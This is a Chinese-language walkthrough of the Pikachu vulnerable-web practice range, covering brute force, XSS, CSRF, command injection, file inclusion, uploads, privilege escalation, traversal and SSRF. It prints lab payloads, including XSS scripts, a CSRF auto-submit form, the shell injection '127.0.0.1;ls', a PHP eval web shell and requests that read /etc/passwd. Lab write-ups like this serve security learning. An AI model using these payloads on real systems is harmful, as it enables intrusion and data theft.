# Pikachu靶场

一直忘了刷这个靶场了，国庆结束想起来做一下，内容都非常基础所以写的比较简单，没有别的大佬的博客内容写的清晰。

## 暴力破解

#### 基于表单的暴力破解

发现/vul/burteforce/bf_form.php是提交用的，post请求体里有`username=123&password=123&submit=Login`，所以扔到burpsuite里的intruder直接爆破即可

<img src="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251010111933727.png" alt="image-20251008212015930" style="zoom: 17%;" /><img src="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251010111933728.png" alt="image-20251008212121258" style="zoom:20%;" />

#### 验证码绕过(onserver）

输入验证码后发现验证码长期有效，所以内容应该同**基于表单的暴力破解**中的内容。

#### 验证码绕过(onclient)

```js
<script language="javascript" type="text/javascript">
    var code; //在全局 定义验证码
    function createCode() {
        code = "";
        var codeLength = 5;//验证码的长度
        var checkCode = document.getElementById("checkCode");
        var selectChar = new Array(0, 1, 2, 3, 4, 5, 6, 7, 8, 9,'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z');//所有候选组成验证码的字符，当然也可以用中文的

        for (var i = 0; i < codeLength; i++) {
            var charIndex = Math.floor(Math.random() * 36);
            code += selectChar[charIndex];
        }
        //alert(code);
        if (checkCode) {
            checkCode.className = "code";
            checkCode.value = code;
        }
    }

    function validate() {
        var inputCode = document.querySelector('#bf_client .vcode').value;
        if (inputCode.length <= 0) {
            alert("请输入验证码！");
            return false;
        } else if (inputCode != code) {
            alert("验证码输入错误！");
            createCode();//刷新验证码
            return false;
        }
        else {
            return true;
        }
    }


    createCode();
</script>
```

发现只有前端对验证码进行校验，所以可以直接忽略掉，内容也与**基于表单的暴力破解**中相同。

![image-20251008213358020](https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251010111933729.png)

#### token防爆破?

抓包，发现请求体中多了一个token参数，所以又观察到在html表单中有一个隐藏的token，所以考虑用pitchfork，

修改token的payload，点击设置里的`Grep—Extract`的添加（中文应该是叫检索-提取），然后点击获取回复，选中token的值复制，然后点击OK，之后输入初始值

<img src="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251010111933731.png" alt="image-20251008231706988" style="zoom:20%;" /><img src="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251010111933732.png" alt="image-20251008231751614" style="zoom:18%;" />

启动即可

## Cross-Site Scripting

XSS原理不解释，自行查找

#### 反射型XSS(get）

**src不收**

先在前端修改输入框的最大长度限制，然后提交下方内容即可，这个是get传参

```js
<script>alert(1);</script>
```



#### 反射型XSS(post)

**src不收**

先用弱密码登录， admin/123456，之后里面有个submit，提交下方内容即可，这个是post传参

```js
<script>alert(1);</script>
```

#### 存储型XSS

好用，影响很严重。

题目都没有waf，所以很好操作，可以用XSS钓鱼

```js
<script>alert(1);</script>
```



#### DOM型XSS

分析一下前端网页代码，可以发现输入框里的参数会被传递给A标签的href属性，输入下方内容提交，之后点击链接即可触发

```js
javascript:alert(1);
```



#### DOM型XSS-X

DOM型XSS-X危害比DOM型XSS更大，可以在URL中体现

看到源码

```js
 <script>
                    function domXSS(){
                        var str = window.location.search;
                        var tXSS = decodeURIComponent(str.split("text=")[1]);
                        var XSS = tXSS.replace(/\+/g,' ');
//                        alert(XSS);

                        document.getElementById("dom").innerHTML = "<a href='"+XSS+"'>就让往事都随风,都随风吧</a>";
                    }
                    //试试：'><img src="#" onmouseover="alert('XSS')">
                    //试试：' onclick="alert('XSS')">,闭合掉就行
                </script>
```

发现是`js`函数利用了`DOM`将字符串拼接并把值赋给a标签的href，然后输出一个`就让往事都随风,都随风吧`，所以我们先给href拼接上，然后再写个onclick1就能0你实现

```js
#' onclick="alert(111)">
```



#### XSS之盲打

只是因为显示不出来，但是后台能看见，如果盲打的话可以偷偷操控某些控件，~~比如实现自动提交？~~

```js
<script>alert(1);</script>
```



#### XSS之过滤

换个标签即可，这个在`XSS cheatshee`t里很多

```js
<img src=xx onerror=alert(1)>
```



#### XSS之htmlspecialchars

`specialchars`这个函数会把单引号，双引号，尖括号过滤了，但是这个函数默认是不过滤单引号的，只有将quotestyle选项为ENT_QUOTES才会过滤单引号。

发现正常的内容会被放到href里面，所以输入

```js
javascript:alert(1)
```

#### XSS之href输出

没懂和**htmlspecialchars**考点有什么区别

```js
javascript:alert(1)
```

#### XSS之js输出

要先把之前的script闭合

```js
'</script><script>alert(1);</script>
</script><script>alert(1);</script>
```



## CSRF

#### CSRF(get)

<img src="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251010111933733.png" alt="image-20251009161713483" style="zoom:25%;" />

抓包可以发现get请求里有修改信息的内容，篡改参数后欺骗用户点击即可

#### CSRF(post)

post请求相比之下就没有那么简单，需要继续诱骗用户进行点击按键才能实现，或许可以用重定向？

<img src="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251010111933734.png" alt="image-20251009163502365" style="zoom:33%;" />

所以搭建一个网站可以重定向来提交表单，或者是用一个button来提交都可以

```html
<!doctype html>
<meta charset="utf-8">
<title>CSRF PoC</title>
<form id="f" method="post" action="http://node.hackhub.get-shell.com:45751/vul/csrf/csrfpost/csrf_post_edit.php">
  <input type="hidden" name="sex" value="123">
  <input type="hidden" name="phonenum" value="123">
  <input type="hidden" name="add" value="123">
  <input type="hidden" name="email" value="123">
</form>
<script>onload=()=>document.getElementById('f').submit();</script>

```

#### CSRF Token

造成CSRF漏洞的主要原因是请求敏感操作的数据包容易被伪造,只要在每次请求时都增加一个`Token`， 每次操作的时候进行验证，可以有效地防止csrf，因为csrf的时候都不能拿到token

## SQL-Inject

后面会直接做sql-lab所以不在这里细写



## RCE

超级基础的rce

#### exec "ping"

用`;`进行截断，或者用`&`、`|`、`&&`和`||`都可以

```
127.0.0.1;ls
```

#### exec "eval"

eval属于危险函数，可以执行php命令，写马执行system都可以

```
system('ls');
```



## File Inclusion

#### File Inclusion(local)

控制filename可以实现任意文件读取，但是好像不能退出这个目录

```
http://node.hackhub.get-shell.com:48833/vul/fileinclude/fi_local.php?filename=file6.php&submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2
```



#### File Inclusion(remote)

在线靶场显示`warning:你的allow_url_include没有打开,请在php.ini中打开了再测试该漏洞,记得修改后,重启中间件服务!`

## Unsafe Filedownload

#### Unsafe Filedownload

可以直接实现文件下载，

```
http://node.hackhub.get-shell.com:48833/vul/unsafedownload/execdownload.php?filename=file6.php
```

## Unsafe Fileupload

#### client check

前端检测无意义，关掉js加载或者直接发包都可以

```php
GIF89a
<?php  @eval($_REQUEST['huaji']);?>
```

![image-20251009184857544](https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251010111933735.png)

#### MIME type

改Content-Type即可，

![image-20251009185011611](https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251010111933736.png)

#### getimagesize

`getimagesize()`函数会通过读取文件头部的几个字符串(即文件头), 来判断是否为正常图片的头部

但是之前传的马已经考虑过了，所以内容不变

## Over Permission

#### 水平越权

登陆上kobe的账号，点击查看个人信息，发现用的是get请求

```
http://node.hackhub.get-shell.com:55190/vul/overpermission/op1/op1_mem.php?username=kobe&submit=点击查看个人信息
```

这个时候只要把username改成其他用户即可水平越权

```
http://node.hackhub.get-shell.com:55190/vul/overpermission/op1/op1_mem.php?username=lucy&submit=点击查看个人信息
```

#### 垂直越权

提示中有：`这里有两个用户admin/123456,pikachu/000000,admin是超级boss`

所以我们登上admin，然后正常搞到一个请求，之后再拿到pikachu账号的cookie：`5ff8a110e136bfab243a2fadb1521b84`，把cookie改一下进行发包

![image-20251009190422334](https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251010111933737.png)

发现修改成功

![image-20251009190437404](https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251010111933738.png)

## ../../

#### 目录遍历

知周所众，`../`可以退出一层目录，所以退出多层就能访问到根目录，从而实现目录遍历

```
http://node.hackhub.get-shell.com:55190/vul/dir/dir_list.php?title=jarheads.php
http://node.hackhub.get-shell.com:55190/vul/dir/dir_list.php?title=123
http://node.hackhub.get-shell.com:55190/vul/dir/dir_list.php?title=../../../../../../../etc/passwd
```

## 敏感信息泄露

#### icanseeyourABC

源代码里注释掉了

```html
<!-- 测试账号:lili/123456-->
```

## PHP反序列化

参考自https://www.cnblogs.com/henry666/p/16947270.html

```php
<?php
class S{
    var $test = "<script>alert('Hacking')</script>";
}

$example = new S();
$SerialString = serialize($example); 
echo $SerialString; #输出: O:1:"S":1:{s:4:"test";s:33:"<script>alert('Hacking')</script>";}

?>
```

基础

## XXE

#### XXE漏洞

https://www.cnblogs.com/backlion/p/9302528.html

用的是在线靶场，所以没有自己写flag在根目录导致读不了文件

## URL重定向

#### 不安全的URL跳转

```
http://3caf3f99-a318-4504-9a53-16a03b792b38.node5.buuoj.cn:81/vul/urlredirect/urlredirect.php?url=unsafere.php
```

修改url参数即可实现跳转位置改变

## SSRF

#### SSRF(curI)

curl支持file协议

```
http://3caf3f99-a318-4504-9a53-16a03b792b38.node5.buuoj.cn:81/vul/ssrf/ssrf_curl.php?url=file:///etc/passwd
```



#### SSRF(file_get_content)

同curl

```
http://3caf3f99-a318-4504-9a53-16a03b792b38.node5.buuoj.cn:81/vul/ssrf/ssrf_fgc.php?file=file:///etc/passwd
```



<p style="text-align: right;">
by. Huaji
</p>